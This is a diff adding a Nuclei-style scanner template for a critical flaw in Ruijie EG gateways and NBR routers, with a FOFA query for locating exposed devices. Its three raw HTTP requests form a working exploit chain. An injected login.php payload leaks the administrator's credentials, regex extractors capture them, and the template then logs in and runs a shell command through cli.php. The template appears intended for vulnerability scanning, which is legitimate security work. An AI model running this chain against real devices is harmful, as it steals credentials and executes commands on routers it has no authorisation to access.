@@ -1,0 +1,71 @@
+id: ruijie-eg-and-nbr-login-php-infoleak-to-rce
+
+info:
+  name: 锐捷EG网管和NBR路由器信息泄露导致远程命令执行
+  author: pphua
+  severity: critical
+  description: 锐捷EG网管和NBR路由器信息泄露导致远程命令执行
+  reference:
+    - https://blog.csdn.net/qq_41617034/article/details/119532322 
+  metadata:
+    fofa-query: app="Ruijie-EG易网关"
+    veified: true
+  tags: ruijie,rce,infoleak,iot,router
+
+http:
+  - raw:
+      - |
+        POST /login.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Moziilla/5.0
+        Content-Type: application/x-www-form-urlencoded
+        X-Requested-With: XMLHttpRequest
+
+        username=admin&password=admin?show+webmaster+user
+
+      - |
+        POST /login.php HTTP/1.1
+        Host: {{Hostname}}
+        X-Requested-With: XMLHttpRequest
+        User-Agent: Moziilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: LOCAL_LANG_COOKIE=zh
+        Connection: close
+
+        username={{username}}&password={{password}}
+
+      - |
+        POST /cli.php?a=shell HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Moziilla/5.0
+        Content-Type: application/x-www-form-urlencoded
+        X-Requested-With: XMLHttpRequest
+
+        notdelay=true&command=df
+
+    cookie-reuse: true
+    extractors:
+      - type: regex
+        name: password
+        part: body_1
+        internal: true
+        group: 2
+        regex:
+          - '00. (.*?) (.*?)["\\s]'
+      - type: regex
+        name: username
+        part: body_1
+        internal: true
+        group: 1
+        regex:
+          - '00. (.*?) (.*?)["\\s]'
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && contains_all(body_1,'WORD','data','00.') && contains_all(header_2,'Set-Cookie')"
+
+      - type: dsl
+        name: rce
+        dsl:
+          - "status_code_3 == 200 && contains_all(tolower(body_3),'true','data','filesystem')"
